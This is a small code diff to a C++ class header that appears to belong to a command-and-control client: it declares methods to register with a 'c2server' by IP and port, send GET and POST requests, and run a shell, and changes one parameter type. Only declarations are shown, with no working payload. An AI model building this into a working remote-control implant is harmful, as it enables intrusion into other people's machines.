@@ -25,7 +25,7 @@ protected:
 public:
 	void Register(std::string ip, unsigned int port);
 	// ip/port for c2server
-	std::string Get(std::string path);
+	std::string Get(std::wstring path);
 	std::string Post(std::string path, std::string data);
 	//std::vector<std::string> GetArgs();
 	static void shell(std::vector<std::string> args);
